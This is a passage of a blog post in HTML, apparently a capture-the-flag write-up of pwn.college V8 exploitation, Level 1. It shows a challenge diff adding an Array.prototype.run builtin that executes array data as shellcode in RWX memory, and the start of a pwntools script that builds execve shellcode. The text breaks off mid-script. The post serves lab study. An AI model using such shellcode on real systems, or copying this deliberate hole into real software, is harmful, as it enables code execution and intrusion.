<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Before all被 QnQSec 的夥伴吸引，第一次學 V8 的東西，一開始是看這篇！   https:&#x2F;&#x2F;www.madstacks.dev&#x2F;posts&#x2F;V8-Exploitation-Series-Part-1   未來會去打更多題目，不過應該會先做一系列整理，只能說真的很好玩 wweb 狗學 v8 pwn 不過分吧，我會想說這是 web雖然我可能又要拖延症了，像是我的 blockchai">
<meta property="og:type" content="article">
<meta property="og:title" content="PWN.COLLEGE - V8 Pwn 學習筆記">
<meta property="og:url" content="http://wha13.github.io/2025/05/04/pwn-college-v8/index.html">
<meta property="og:site_name" content="Whale120&#39;s Blog">
<meta property="og:description" content="Before all被 QnQSec 的夥伴吸引，第一次學 V8 的東西，一開始是看這篇！   https:&#x2F;&#x2F;www.madstacks.dev&#x2F;posts&#x2F;V8-Exploitation-Series-Part-1   未來會去打更多題目，不過應該會先做一系列整理，只能說真的很好玩 wweb 狗學 v8 pwn 不過分吧，我會想說這是 web雖然我可能又要拖延症了，像是我的 blockchai">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/SkBAaCYyel.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJVapCFJeg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1YNACKyee.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1SCstcJle.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1ZDit9Jxl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SybJUfo1eg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1jE8fokgx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1qmEzokel.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJCd4Gjkeg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1fR4MsJee.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1MDeXikge.png">
<meta property="article:published_time" content="2025-05-04T06:02:02.000Z">
<meta property="article:modified_time" content="2025-05-05T14:23:20.827Z">
<meta property="article:author" content="William Lin">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="V8">
<meta property="article:tag" content="browser">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/SkBAaCYyel.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>PWN.COLLEGE - V8 Pwn 學習筆記</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/06/19/2025-smiley-ctf/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/04/24/thjcc-2025-1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/05/04/pwn-college-v8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/05/04/pwn-college-v8/&text=PWN.COLLEGE - V8 Pwn 學習筆記"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/05/04/pwn-college-v8/&title=PWN.COLLEGE - V8 Pwn 學習筆記"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/05/04/pwn-college-v8/&is_video=false&description=PWN.COLLEGE - V8 Pwn 學習筆記"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=PWN.COLLEGE - V8 Pwn 學習筆記&body=Check out this article: http://wha13.github.io/2025/05/04/pwn-college-v8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/05/04/pwn-college-v8/&title=PWN.COLLEGE - V8 Pwn 學習筆記"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/05/04/pwn-college-v8/&title=PWN.COLLEGE - V8 Pwn 學習筆記"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/05/04/pwn-college-v8/&title=PWN.COLLEGE - V8 Pwn 學習筆記"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/05/04/pwn-college-v8/&title=PWN.COLLEGE - V8 Pwn 學習筆記"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/05/04/pwn-college-v8/&name=PWN.COLLEGE - V8 Pwn 學習筆記&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/05/04/pwn-college-v8/&t=PWN.COLLEGE - V8 Pwn 學習筆記"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-1"><span class="toc-number">2.</span> <span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-2"><span class="toc-number">3.</span> <span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-3"><span class="toc-number">4.</span> <span class="toc-text">Level 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-4"><span class="toc-number">5.</span> <span class="toc-text">Level 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-5"><span class="toc-number">6.</span> <span class="toc-text">Level 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-6"><span class="toc-number">7.</span> <span class="toc-text">Level 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-7"><span class="toc-number">8.</span> <span class="toc-text">Level 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-8"><span class="toc-number">9.</span> <span class="toc-text">Level 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-9"><span class="toc-number">10.</span> <span class="toc-text">Level 9</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        PWN.COLLEGE - V8 Pwn 學習筆記
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">William Lin</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-05-04T06:02:02.000Z" class="dt-published" itemprop="datePublished">2025-05-04</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/V8/" rel="tag">V8</a>, <a class="p-category" href="/tags/browser/" rel="tag">browser</a>, <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>被 QnQSec 的夥伴吸引，第一次學 V8 的東西，一開始是看這篇！  </p>
<p><a target="_blank" rel="noopener" href="https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-1">https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-1</a>  </p>
<p>未來會去打更多題目，不過應該會先做一系列整理，只能說真的很好玩 w<br><del>web 狗學 v8 pwn 不過分吧，我會想說這是 web</del><br><del>雖然我可能又要拖延症了，像是我的 blockchain, zkp, xsleak, ECDSA, ……</del><br>現在筆記還亂亂的、、、之後會重新補一些東西（如果真的有人在看 :p）  </p>
<p>題目們：<a target="_blank" rel="noopener" href="https://pwn.college/quarterly-quiz/v8-exploitation/">https://pwn.college/quarterly-quiz/v8-exploitation/</a>  </p>
<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p>Js 型別轉換 Helpers: <a target="_blank" rel="noopener" href="https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-6/">https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-6/</a>  </p>
<p>diff patch:<br>主要就是新增了一個 ArrayRun 的函數，並且在 boostrap.cc 上新增了調用方法，是 prototype 的 <code>.run</code> 可呼叫  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-<span class="built_in">array</span>.cc b/src/builtins/builtins-<span class="built_in">array</span>.cc</span><br><span class="line">index ea45a7ada6b..c840e568152 <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/builtins-<span class="built_in">array</span>.cc</span><br><span class="line">+++ b/src/builtins/builtins-<span class="built_in">array</span>.cc</span><br><span class="line">@@ <span class="number">-24</span>,<span class="number">6</span> +<span class="number">24</span>,<span class="number">8</span> @@</span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/objects/prototype.h&quot;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/objects/smi.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line">+<span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line">+</span><br><span class="line"> namespace v8 &#123;</span><br><span class="line"> namespace internal &#123;</span><br><span class="line"> </span><br><span class="line">@@ <span class="number">-407</span>,<span class="number">6</span> +<span class="number">409</span>,<span class="number">47</span> @@ BUILTIN(ArrayPush) &#123;</span><br><span class="line">   <span class="keyword">return</span> *isolate-&gt;factory()-&gt;NewNumberFromUint((new_length));</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">+BUILTIN(ArrayRun) &#123;</span><br><span class="line">+  HandleScope <span class="title function_">scope</span><span class="params">(isolate)</span>;</span><br><span class="line">+  Factory *factory = isolate-&gt;factory();</span><br><span class="line">+  Handle&lt;Object&gt; receiver = args.receiver();</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">if</span> (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast&lt;JSArray&gt;(*receiver))) &#123;</span><br><span class="line">+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span><br><span class="line">+      factory-&gt;NewStringFromAsciiChecked(<span class="string">&quot;Nope&quot;</span>)));</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  Handle&lt;JSArray&gt; <span class="built_in">array</span> = Cast&lt;JSArray&gt;(receiver);</span><br><span class="line">+  ElementsKind kind = <span class="built_in">array</span>-&gt;GetElementsKind();</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">if</span> (kind != PACKED_DOUBLE_ELEMENTS) &#123;</span><br><span class="line">+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span><br><span class="line">+      factory-&gt;NewStringFromAsciiChecked(<span class="string">&quot;Need array of double numbers&quot;</span>)));</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  <span class="type">uint32_t</span> length = static_cast&lt;<span class="type">uint32_t</span>&gt;(Object::NumberValue(<span class="built_in">array</span>-&gt;length()));</span><br><span class="line">+  <span class="keyword">if</span> (<span class="keyword">sizeof</span>(<span class="type">double</span>) * (<span class="type">uint64_t</span>)length &gt; <span class="number">4096</span>) &#123;</span><br><span class="line">+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span><br><span class="line">+      factory-&gt;NewStringFromAsciiChecked(<span class="string">&quot;array too long&quot;</span>)));</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  <span class="comment">// mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span></span><br><span class="line">+  <span class="type">double</span> *mem = (<span class="type">double</span> *)mmap(<span class="literal">NULL</span>, <span class="number">4096</span>, <span class="number">7</span>, <span class="number">0x22</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">+  <span class="keyword">if</span> (mem == (<span class="type">double</span> *)<span class="number">-1</span>) &#123;</span><br><span class="line">+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span><br><span class="line">+      factory-&gt;NewStringFromAsciiChecked(<span class="string">&quot;mmap failed&quot;</span>)));</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  Handle&lt;FixedDoubleArray&gt; <span class="title function_">elements</span><span class="params">(Cast&lt;FixedDoubleArray&gt;(<span class="built_in">array</span>-&gt;elements()), isolate)</span>;</span><br><span class="line">+  FOR_WITH_HANDLE_SCOPE(isolate, <span class="type">uint32_t</span>, i = <span class="number">0</span>, i, i &lt; length, i++, &#123;</span><br><span class="line">+    <span class="type">double</span> x = elements-&gt;get_scalar(i);</span><br><span class="line">+    mem[i] = x;</span><br><span class="line">+  &#125;);</span><br><span class="line">+</span><br><span class="line">+  ((<span class="type">void</span> (*)())mem)();</span><br><span class="line">+  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> namespace &#123;</span><br><span class="line"> </span><br><span class="line"> V8_WARN_UNUSED_RESULT Tagged&lt;Object&gt; <span class="title function_">GenericArrayPop</span><span class="params">(Isolate* isolate,</span></span><br><span class="line"><span class="params">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="params">index <span class="number">78</span>cbf8874ed.<span class="number">.4</span>f3d885cca7 <span class="number">100644</span></span></span><br><span class="line"><span class="params">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="params">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="params">@@ <span class="number">-421</span>,<span class="number">6</span> +<span class="number">421</span>,<span class="number">7</span> @@ namespace internal &#123;</span></span><br><span class="line"><span class="params">   TFJ(ArrayPrototypePop, kDontAdaptArgumentsSentinel)                          \</span></span><br><span class="line"><span class="params">   <span class="comment">/* ES6 #sec-array.prototype.push */</span>                                          \</span></span><br><span class="line"><span class="params">   CPP(ArrayPush)                                                               \</span></span><br><span class="line"><span class="params">+  CPP(ArrayRun)                                                                \</span></span><br><span class="line"><span class="params">   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \</span></span><br><span class="line"><span class="params">   <span class="comment">/* ES6 #sec-array.prototype.shift */</span>                                         \</span></span><br><span class="line"><span class="params">   CPP(ArrayShift)                                                              \</span></span><br><span class="line"><span class="params">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="params">index <span class="number">9</span>a346d134b9.<span class="number">.58</span>fd42e59a4 <span class="number">100644</span></span></span><br><span class="line"><span class="params">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="params">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="params">@@ <span class="number">-1937</span>,<span class="number">6</span> +<span class="number">1937</span>,<span class="number">8</span> @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span></span><br><span class="line"><span class="params">       <span class="keyword">return</span> Type::Receiver();</span></span><br><span class="line"><span class="params">     <span class="keyword">case</span> Builtin::kArrayUnshift:</span></span><br><span class="line"><span class="params">       <span class="keyword">return</span> t-&gt;cache_-&gt;kPositiveSafeInteger;</span></span><br><span class="line"><span class="params">+	<span class="keyword">case</span> Builtin::kArrayRun:</span></span><br><span class="line"><span class="params">+	  <span class="keyword">return</span> Type::Receiver();</span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params">     <span class="comment">// ArrayBuffer functions.</span></span></span><br><span class="line"><span class="params">     <span class="keyword">case</span> Builtin::kArrayBufferIsView:</span></span><br><span class="line"><span class="params">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span></span><br><span class="line"><span class="params">index facf0d86d79.<span class="number">.382</span>c015bc48 <span class="number">100644</span></span></span><br><span class="line"><span class="params">--- a/src/d8/d8.cc</span></span><br><span class="line"><span class="params">+++ b/src/d8/d8.cc</span></span><br><span class="line"><span class="params">@@ <span class="number">-3364</span>,<span class="number">7</span> +<span class="number">3364</span>,<span class="number">7</span> @@ Local&lt;FunctionTemplate&gt; Shell::CreateNodeTemplates(</span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params"> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span></span><br><span class="line"><span class="params">   Local&lt;ObjectTemplate&gt; global_template = ObjectTemplate::New(isolate);</span></span><br><span class="line"><span class="params">-  global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span></span><br><span class="line"><span class="params">+<span class="comment">/*  global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span></span></span><br><span class="line"><span class="comment"><span class="params">                        String::NewFromUtf8Literal(isolate, &quot;global&quot;));</span></span></span><br><span class="line"><span class="comment"><span class="params">   global_template-&gt;Set(isolate, &quot;version&quot;,</span></span></span><br><span class="line"><span class="comment"><span class="params">                        FunctionTemplate::New(isolate, Version));</span></span></span><br><span class="line"><span class="comment"><span class="params">@@ -3385,13 +3385,13 @@ Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span></span></span><br><span class="line"><span class="comment"><span class="params">   global_template-&gt;Set(isolate, &quot;readline&quot;,</span></span></span><br><span class="line"><span class="comment"><span class="params">                        FunctionTemplate::New(isolate, ReadLine));</span></span></span><br><span class="line"><span class="comment"><span class="params">   global_template-&gt;Set(isolate, &quot;load&quot;,</span></span></span><br><span class="line"><span class="comment"><span class="params">-                       FunctionTemplate::New(isolate, ExecuteFile));</span></span></span><br><span class="line"><span class="comment"><span class="params">+                       FunctionTemplate::New(isolate, ExecuteFile));*/</span></span></span><br><span class="line"><span class="params">   global_template-&gt;Set(isolate, <span class="string">&quot;setTimeout&quot;</span>,</span></span><br><span class="line"><span class="params">                        FunctionTemplate::New(isolate, SetTimeout));</span></span><br><span class="line"><span class="params">   <span class="comment">// Some Emscripten-generated code tries to call &#x27;quit&#x27;, which in turn would</span></span></span><br><span class="line"><span class="params">   <span class="comment">// call C&#x27;s exit(). This would lead to memory leaks, because there is no way</span></span></span><br><span class="line"><span class="params">   <span class="comment">// we can terminate cleanly then, so we need a way to hide &#x27;quit&#x27;.</span></span></span><br><span class="line"><span class="params">-  <span class="keyword">if</span> (!options.omit_quit) &#123;</span></span><br><span class="line"><span class="params">+<span class="comment">/*  if (!options.omit_quit) &#123;</span></span></span><br><span class="line"><span class="comment"><span class="params">     global_template-&gt;Set(isolate, &quot;quit&quot;, FunctionTemplate::New(isolate, Quit));</span></span></span><br><span class="line"><span class="comment"><span class="params">   &#125;</span></span></span><br><span class="line"><span class="comment"><span class="params">   global_template-&gt;Set(isolate, &quot;testRunner&quot;,</span></span></span><br><span class="line"><span class="comment"><span class="params">@@ -3410,7 +3410,7 @@ Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span></span></span><br><span class="line"><span class="comment"><span class="params">   if (i::v8_flags.expose_async_hooks) &#123;</span></span></span><br><span class="line"><span class="comment"><span class="params">     global_template-&gt;Set(isolate, &quot;async_hooks&quot;,</span></span></span><br><span class="line"><span class="comment"><span class="params">                          Shell::CreateAsyncHookTemplate(isolate));</span></span></span><br><span class="line"><span class="comment"><span class="params">-  &#125;</span></span></span><br><span class="line"><span class="comment"><span class="params">+  &#125;*/</span></span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params">   <span class="keyword">return</span> global_template;</span></span><br><span class="line"><span class="params"> &#125;</span></span><br><span class="line"><span class="params">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="params">index <span class="number">48249695b</span>7b.<span class="number">.40</span>a762c24c8 <span class="number">100644</span></span></span><br><span class="line"><span class="params">--- a/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="params">+++ b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="params">@@ <span class="number">-2533</span>,<span class="number">6</span> +<span class="number">2533</span>,<span class="number">8</span> @@ <span class="type">void</span> Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;at&quot;</span>, Builtin::kArrayPrototypeAt, <span class="number">1</span>,</span></span><br><span class="line"><span class="params">                           <span class="literal">true</span>);</span></span><br><span class="line"><span class="params">+    SimpleInstallFunction(isolate_, proto, <span class="string">&quot;run&quot;</span>,</span></span><br><span class="line"><span class="params">+                          Builtin::kArrayRun, <span class="number">0</span>, <span class="literal">false</span>);</span></span><br><span class="line"><span class="params">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;concat&quot;</span>,</span></span><br><span class="line"><span class="params">                           Builtin::kArrayPrototypeConcat, <span class="number">1</span>, <span class="literal">false</span>);</span></span><br><span class="line"><span class="params">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;copyWithin&quot;</span>,</span></span><br></pre></td></tr></table></figure>

<p>注意到 ArrayRun 函數的邏輯就是：<br>傳入 receiver &#x3D;&gt; 確認 array 型別是 double &#x3D;&gt; 大小確認小於 4096B (盲猜 heap 翻頁問題) &#x3D;&gt; 聲請一塊 rwx 去把剛剛的 array 複製上去當 shellcode 跑  </p>
<p>其實很簡單，塞 shellcode 就好，但是他只接受 DoubleArray，我是先寫 Python 腳本把讀 flag 的 shellcode 變成 long long，再到 js 轉成 Float64Array w  </p>
<p><strong>gen.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># payload = asm(shellcraft.execve(&quot;/bin/sh&quot;, 0, 0))</span></span><br><span class="line">payload = asm(shellcraft.execve(<span class="string">&quot;/challenge/catflag&quot;</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">int_arr = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(payload), <span class="number">8</span>):</span><br><span class="line">    int_arr.append(<span class="string">f&quot;i2f(0x<span class="subst">&#123;payload[i:i+<span class="number">8</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)[::-<span 